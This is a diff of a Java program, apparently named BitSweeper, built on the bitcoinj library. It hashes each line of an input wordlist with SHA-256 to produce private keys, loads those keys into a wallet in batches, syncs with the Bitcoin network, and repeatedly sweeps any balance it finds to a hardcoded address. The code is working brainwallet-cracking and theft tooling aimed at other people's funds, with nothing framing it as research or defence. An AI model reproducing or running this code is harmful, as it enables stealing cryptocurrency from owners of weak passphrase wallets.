@@ -2,13 +2,15 @@ package com.bitmixr;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileReader;
+import java.io.IOException;
 import java.math.BigInteger;
 import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
-import java.util.HashSet;
 import java.util.List;
-import java.util.Set;
+import java.util.concurrent.locks.ReentrantLock;
 
 import org.apache.log4j.Level;
 import org.apache.log4j.Logger;
@@ -20,6 +22,7 @@ import com.google.bitcoin.core.BlockChain;
 import com.google.bitcoin.core.ECKey;
 import com.google.bitcoin.core.NetworkParameters;
 import com.google.bitcoin.core.PeerGroup;
+import com.google.bitcoin.core.ScriptException;
 import com.google.bitcoin.core.Transaction;
 import com.google.bitcoin.core.Utils;
 import com.google.bitcoin.core.VerificationException;
@@ -28,35 +31,84 @@ import com.google.bitcoin.core.Wallet.SendRequest;
 import com.google.bitcoin.discovery.DnsDiscovery;
 import com.google.bitcoin.discovery.SeedPeers;
 import com.google.bitcoin.store.BlockStore;
-import com.google.bitcoin.store.MemoryFullPrunedBlockStore;
+import com.google.bitcoin.store.MemoryBlockStore;
 import com.google.common.util.concurrent.FutureCallback;
 import com.google.common.util.concurrent.Futures;
 import com.google.common.util.concurrent.MoreExecutors;
 
 public class BitSweeper {
 
-	public static void main(String[] args) throws Exception {
+	public static class PeerRestarter {
+		public volatile boolean running = true;
+		public PeerGroup peerGroup;
+
+		public PeerRestarter(PeerGroup aPeerGroup) throws InterruptedException {
+			peerGroup = aPeerGroup;
+		}
+
+		public void go() {
+			Thread t = new Thread() {
+				@Override
+				public void run() {
+					while (running) {
+						try {
+							System.in.read();
+						} catch (IOException e) {
+							throw new RuntimeException(e.getMessage(), e);
+						}
+						if (!running) {
+							return;
+						}
+						try {
+							peerGroup.changePeer();
+						} catch (Exception e) {
+
+						}
+					}
+				}
+			};
+			t.start();
+
+			Thread tr = new Thread() {
+				@Override
+				public void run() {
+					while (running) {
+						try {
+							Thread.sleep(900000);
+						} catch (InterruptedException e) {
+							throw new RuntimeException(e.getMessage(), e);
+						}
+						if (!running) {
+							return;
+						}
+						try {
+							peerGroup.changePeer();
+						} catch (Exception e) {
+
+						}
+					}
+				}
+			};
+			tr.start();
+
+		}
+	}
+
+	public static void main(final String[] args) throws Exception {
 		final NetworkParameters params = NetworkParameters.prodNet();
-		final BlockStore blockStore;
-		final BlockChain chain;
-		final PeerGroup peerGroup;
+		BlockStore blockStore;
+		BlockChain chain;
+		PeerGroup peerGroup;
+
+		final List<ECKey> keyList = new ArrayList<>();
+		final ReentrantLock keyListLock = new ReentrantLock();
 		// Try to read the wallet from storage, create a new one if not
 		// possible.
 		Logger.getRootLogger().setLevel(Level.WARN);
-		// File file = new File("production.spvchain");
-		// boolean chainExistedAlready = file.exists();
-		// blockStore = new SPVBlockStore(params, file);
-		// if (!chainExistedAlready) {
-		// File checkpointsFile = new File("checkpoints");
-		// if (checkpointsFile.exists()) {
-		// FileInputStream stream = new FileInputStream(checkpointsFile);
-		// CheckpointManager.checkpoint(params, stream, blockStore, 0);
-		// }
-		// }
-		blockStore = new MemoryFullPrunedBlockStore(params, Integer.MAX_VALUE);
-		// Connect to the localhost node. One minute timeout since we won't try
-		// any other peers
-		System.out.println("Connecting ...");
+		// blockStore = new ReplayableBlockStore(params, new
+		// File("production.replay"), true);
+
+		blockStore = new MemoryBlockStore(params);
 		chain = new BlockChain(params, blockStore);
 		peerGroup = new PeerGroup(params, chain);
 		peerGroup.setUserAgent("PingService", "1.0");
@@ -64,55 +116,11 @@ public class BitSweeper {
 		peerGroup.addPeerDiscovery(new DnsDiscovery(params));
 		// peerGroup.setFastCatchupTimeSecs((System.currentTimeMillis() / 1000)
 		// - 6000000);
-		final Wallet wallet = new Wallet(params);
+		PeerRestarter pr = new PeerRestarter(peerGroup);
+		Wallet wallet = new Wallet(params);
 
-		BufferedReader br = new BufferedReader(new FileReader(new File(args[0])));
-		String line;
-		MessageDigest md = MessageDigest.getInstance("SHA-256");
-		int x = 0;
-		Set<byte[]> currentSet = new HashSet<>();
-		List<Thread> threads = new ArrayList<>();
-		while ((line = br.readLine()) != null) {
-			md.update(line.getBytes());
-			currentSet.add(md.digest());
-			x++;
-			if (x % 50000 == 0) {
-				System.out.println(x);
-				final Set<byte[]> mySet = currentSet;
-				Thread t = new Thread() {
-					@Override
-					public void run() {
-						for (byte[] b : mySet) {
-							ECKey key = new ECKey(new BigInteger(1, b));
-							wallet.addKey(key);
-						}
-					}
-				};
-				t.start();
-				threads.add(t);
-				currentSet = new HashSet<>();
-			}
-		}
-		final Set<byte[]> mySet = currentSet;
-		Thread tr = new Thread() {
-			@Override
-			public void run() {
-				for (byte[] b : mySet) {
-					ECKey key = new ECKey(new BigInteger(1, b));
-					wallet.addKey(key);
-				}
-			}
-		};
-		tr.start();
-		threads.add(tr);
-		// System.out.println(System.currentTimeMillis() - time);
-		br.close();
-		for (Thread t : threads) {
-			t.join();
-		}
-		peerGroup.addWallet(wallet);
 		chain.addWallet(wallet);
-
+		peerGroup.addWallet(wallet);
 		wallet.addEventListener(new AbstractWalletEventListener() {
 
 			@Override
@@ -120,59 +128,160 @@ public class BitSweeper {
 				final BigInteger value = tx.getValueSentToMe(w);
 				System.out.println("Received pending tx for " + Utils.bitcoinValueToFriendlyString(value) + ": " + tx);
 			}
-		});
 
-		peerGroup.startAndWait();
-		// // Now make sure that we shut down cleanly!
-		peerGroup.waitForPeers(2);
-		peerGroup.downloadBlockChain();
-		try {
-			Thread.sleep(15000);
-		} catch (InterruptedException e) {
-			throw new RuntimeException(e.getMessage(), e);
-		}
-		// Now send the coins back!
-		new Thread() {
 			@Override
-			public void run() {
-				// Now send the coins back!
-				final Address from;
+			public void onCoinsSent(Wallet wallet, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
 				try {
-					from = new Address(params, "14rksGEhDzYUiRuYDAeS94huLn4f3Kxg2o");
-				} catch (AddressFormatException e1) {
-					throw new RuntimeException(e1.getMessage(), e1);
-				}
-				//
-				SendRequest request = Wallet.SendRequest.to(from, wallet.getBalance());
-				if (!wallet.completeTx(request))
-					return; // Insufficient funds.
-				// Ensure these funds won't be spent
-				// again.
-				try {
-					wallet.commitTx(request.tx);
-				} catch (VerificationException e) {
+					System.out.println("Spent: " + Utils.bitcoinValueToFriendlyString(tx.getValueSentFromMe(wallet)) + ": " + tx);
+				} catch (ScriptException e) {
 					throw new RuntimeException(e.getMessage(), e);
 				}
-				// // wallet.saveToFile(...);
-				// // A proposed transaction is now sitting
-				// // in request.tx - send it in the
-				// // background.
-				//
-				Futures.addCallback(peerGroup.broadcastTransaction(request.tx), new FutureCallback<Transaction>() {
-					@Override
-					public void onFailure(Throwable t) {
-						t.printStackTrace();
-					}
-
-					@Override
-					public void onSuccess(Transaction result) {
-						System.out.println("SENT!!!");
-					}
-				}, MoreExecutors.sameThreadExecutor());
-
 			}
-		}.start();
+		});
 
-		Thread.sleep(Integer.MAX_VALUE);
+		Thread keyThread = new Thread() {
+			@Override
+			public void run() {
+				BufferedReader br;
+				try {
+					br = new BufferedReader(new FileReader(new File(args[0])));
+				} catch (FileNotFoundException e1) {
+					throw new RuntimeException(e1.getMessage(), e1);
+				}
+				String line;
+				int x = 0;
+				int skip = 1;
+				int records = 10000;
+				MessageDigest md;
+				try {
+					md = MessageDigest.getInstance("SHA-256");
+				} catch (NoSuchAlgorithmException e) {
+					throw new RuntimeException(e.getMessage(), e);
+				}
+
+				try {
+					while ((line = br.readLine()) != null) {
+						x++;
+						if (x < 100000) {
+							continue;
+						}
+						md.update(line.getBytes());
+						ECKey key = new ECKey(new BigInteger(1, md.digest()));
+						key.setCreationTimeSeconds(0);
+						Thread.yield();
+						keyListLock.lock();
+						keyList.add(key);
+						keyListLock.unlock();
+					}
+				} catch (IOException e) {
+					throw new RuntimeException(e.getMessage(), e);
+				}
+			}
+		};
+		keyThread.start();
+
+		Thread.sleep(60000);
+		while (true) {
+			int x = 0;
+			keyListLock.lock();
+			if (keyList.size() > 10000) {
+				wallet.keychain.addAll(keyList.subList(0, 10000));
+			} else {
+				wallet.keychain.addAll(keyList);
+			}
+			keyList.removeAll(wallet.keychain);
+			keyListLock.unlock();
+			final Wallet w = wallet;
+			final PeerGroup p = peerGroup;
+			peerGroup.lock.lock();
+			peerGroup.recalculateFastCatchupAndFilter();
+			peerGroup.lock.unlock();
+			peerGroup.startAndWait();
+			peerGroup.waitForPeers(2);
+			pr.go();
+			peerGroup.downloadBlockChain();
+			Thread send = new Thread() {
+				@Override
+				public void run() {
+					// Now send the coins back!
+					while (true) {
+						try {
+							Thread.sleep(1000);
+						} catch (InterruptedException e) {
+							throw new RuntimeException(e.getMessage(), e);
+						}
+						final Address from;
+						try {
+							from = new Address(params, "14rksGEhDzYUiRuYDAeS94huLn4f3Kxg2o");
+						} catch (AddressFormatException e1) {
+							throw new RuntimeException(e1.getMessage(), e1);
+						}
+						//
+						SendRequest request = Wallet.SendRequest.to(from, w.getBalance());
+						if (!w.completeTx(request)) {
+							return; // Insufficient funds.
+						}
+						// Ensure these funds won't be spent
+						// again.
+						try {
+							w.commitTx(request.tx);
+						} catch (VerificationException e) {
+							throw new RuntimeException(e.getMessage(), e);
+						}
+						// // wallet.saveToFile(...);
+						// // A proposed transaction is now sitting
+						// // in request.tx - send it in the
+						// // background.
+						//
+						Futures.addCallback(p.broadcastTransaction(request.tx), new FutureCallback<Transaction>() {
+							@Override
+							public void onFailure(Throwable t) {
+								t.printStackTrace();
+							}
+
+							@Override
+							public void onSuccess(Transaction result) {
+								System.out.println("SENT!!!");
+							}
+						}, MoreExecutors.sameThreadExecutor());
+					}
+
+				}
+			};
+			send.start();
+			Thread.sleep(20000);
+			send.join();
+			peerGroup.stop();
+			blockStore.close();
+			pr.running = false;
+			wallet = new Wallet(params);
+			wallet.addEventListener(new AbstractWalletEventListener() {
+
+				@Override
+				public void onCoinsReceived(final Wallet w, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
+					final BigInteger value = tx.getValueSentToMe(w);
+					System.out.println("Received pending tx for " + Utils.bitcoinValueToFriendlyString(value) + ": " + tx);
+				}
+
+				@Override
+				public void onCoinsSent(Wallet wallet, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
+					try {
+						System.out.println("Spent: " + Utils.bitcoinValueToFriendlyString(tx.getValueSentFromMe(wallet)) + ": " + tx);
+					} catch (ScriptException e) {
+						throw new RuntimeException(e.getMessage(), e);
+					}
+				}
+			});
+			blockStore = new MemoryBlockStore(params);
+			chain = new BlockChain(params, blockStore);
+			peerGroup = new PeerGroup(params, chain);
+			peerGroup.setUserAgent("PingService", "1.0");
+			peerGroup.addPeerDiscovery(new SeedPeers(params));
+			peerGroup.addPeerDiscovery(new DnsDiscovery(params));
+			chain.addWallet(wallet);
+			peerGroup.addWallet(wallet);
+			pr = new PeerRestarter(peerGroup);
+
+		}
 	}
 }
